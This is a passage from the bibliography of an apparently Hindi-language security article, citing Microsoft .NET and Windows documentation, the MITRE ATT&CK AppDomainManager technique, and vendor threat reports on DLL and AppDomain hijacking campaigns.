- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – तेज़ और उग्र: Iranian Conflict के दौरान Nimbus Manticore Operations](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 ने दक्षिण-पूर्व एशियाई सरकारों और Critical Infrastructure को निशाना बनाया](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Elastic Security Labs – Elastic Defend 9.5.0 के साथ Windows DLL Search-Order Hijacking का पुनर्निर्माण और पता लगाना](https://www.elastic.co/security-labs/threat-command/dll-search-order-hijacking-elastic-defend)
- [27] [Microsoft Learn – Native AOT के साथ native libraries बनाना](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/libraries)
- [28] [Microsoft Learn – Native AOT के साथ native exports](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/interop#native-exports)
- [29] [Microsoft Learn – ModuleInitializerAttribute](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.compilerservices.moduleinitializerattribute?view=net-7.0)
- [30] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [31] [Microsoft Learn – PE format](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [32] [FortiGuard Labs – Legitimate Software में Embedded SectopRAT Variant का पता लगाना](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [33] [Mandiant – LIGHTSHOW की चोरी (भाग एक)](https://cloud.google.com/blog/topics/threat-intelligence/lightshow-north-korea-unc2970/)
- [34] [Kaspersky Securelist – Operation FlashHole](https://securelist.com/lazarus-operation-flashhole/121541/)
